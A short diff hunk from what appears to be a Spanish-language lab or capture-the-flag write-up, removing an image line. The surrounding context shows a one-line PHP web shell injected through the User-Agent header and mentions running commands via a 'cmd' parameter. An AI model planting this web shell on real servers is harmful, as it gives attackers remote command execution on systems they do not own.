@@ -39,7 +39,6 @@ Modificamos el php mediante el parámetro user-Agent:
 <?php system($_GET['cmd']);?>
 ```
 
-![](agent.png)
 
 Podemos ejecutar comandos mediante el parámetro ``&cmd=``
 ```bash
